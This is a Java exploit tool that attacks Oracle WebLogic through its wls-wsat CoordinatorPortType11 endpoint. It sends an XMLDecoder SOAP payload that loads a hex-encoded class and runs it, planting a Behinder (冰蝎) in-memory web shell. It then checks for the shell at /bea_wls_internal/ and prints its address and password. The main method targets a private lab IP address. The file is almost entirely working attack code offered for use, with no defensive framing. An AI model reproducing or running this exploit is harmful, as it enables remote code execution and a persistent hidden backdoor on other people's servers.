package org.example;

import org.example.tools.Response;
import org.example.tools.HttpTools;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;

public class Memshell10271 {
    private static final HashMap<String, String> headers = new HashMap<>();

    public static byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 4];
        int n;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    public static String toHexString(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    public static String getHexString(String className, String newUri, String password) throws NoSuchAlgorithmException, IOException {
        getPayload a = new getPayload();
        a.GetPayload(newUri, password, className);
        InputStream in = Files.newInputStream(Paths.get(className + ".class"));
        byte[] data = toByteArray(in);
        in.close();
        String HexString = toHexString(data);
        try {
            File file = new File(className + "_hex.txt");
            PrintStream ps = new PrintStream(new FileOutputStream(file));
            ps.println(HexString);
        } catch (FileNotFoundException ignored) {}
        return HexString;
    }

    public static void InjectMemshell(String url, String className, String newUri, String password) throws NoSuchAlgorithmException, IOException {
        String encoding = "UTF-8";
        headers.put("Content-type", "text/xml");
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n         <java>\n    <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\">\n        <string>0x" + getHexString(className, newUri, password) + "</string>\n    </void>\n    <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n        <void method=\"defineClass\">\n            <string>" + className + "</string>\n            <object idref=\"cls\"></object>\n            <void method=\"newInstance\">\n                <void method=\"main\">\n                    <array class=\"java.lang.String\"></array>\n                </void>\n            </void>\n        </void>\n    </void>\n</java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";
        HttpTools.post(url + "/wls-wsat/CoordinatorPortType11", payload, headers, encoding);
    }

    public static String checkMemshell(String url, String newUri, String password) {
        String encoding = "UTF-8";
        Response response = HttpTools.get(url + "/bea_wls_internal/" + newUri, headers, encoding);
        if (response.getCode() == 200) {
            return "[+] 注入冰蝎内存马成功！\n[*] 冰蝎servlet地址：" + url + "/bea_wls_internal/" + newUri + " 密码：" + password + "\n";
        }
        return "[-] 注入内存马失败：" + url + "/bea_wls_internal/" + newUri ;
    }

    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {
        String url = "http://192.168.198.173:7001";
        String className = "evilW01fh4cker";
        String newUri = "evillogina";
        String password = "W01fh4cker";
        InjectMemshell(url, className, newUri, password);
        System.out.println(checkMemshell(url, newUri, password));
    }
}